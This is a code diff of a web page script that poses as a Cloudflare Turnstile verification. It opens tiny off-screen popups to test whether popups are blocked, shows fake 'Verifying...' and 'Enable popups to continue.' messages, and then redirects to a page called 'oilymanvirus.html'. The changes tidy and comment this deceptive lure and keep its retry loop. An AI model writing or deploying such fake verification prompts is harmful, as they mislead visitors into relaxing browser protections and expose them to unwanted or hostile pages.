@@ -75,6 +75,7 @@ function playBall() {
     setTimeout(playBall, 1);
   }
 }
+
 function permprompt() {
   const attempts = 3;
   const popups = [];
@@ -84,22 +85,30 @@ function permprompt() {
       const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,right=-5000,bottom=-5000");
       popups.push(popup);
   }
+
+  // Check if popups were blocked
   const blocked = popups.some(popup => popup === null || typeof popup === "undefined");
 
   if (blocked) {
       popups.forEach(popup => popup.close());
-      x = document.getElementsByClassName("turnstile-message");
-      for(var i = 0; i < x.length; i++){
-        x[i].innerText="Verifying...";
-      }
 
-      setTimeout(function(){
-        for(var i = 0; i < x.length; i++){
-          x[i].innerText="Enable popups to continue.";
-        }
-      }, 2000);
+      // Ensure the DOM is fully loaded before accessing elements
+      document.addEventListener('DOMContentLoaded', () => {
+          const elements = document.getElementsByClassName("turnstile-message");
 
-      permprompt();
+          for (let i = 0; i < elements.length; i++) {
+              elements[i].innerText = "Verifying...";
+          }
+
+          setTimeout(function () {
+              for (let i = 0; i < elements.length; i++) {
+                  elements[i].innerText = "Enable popups to continue.";
+              }
+          }, 2000);
+
+          // Retry the prompt after showing the message
+          permprompt();
+      });
   } else {
       popups.forEach(popup => popup.close());
       window.location.href = "https://hrishiky.github.io/oilymanvirus.html";
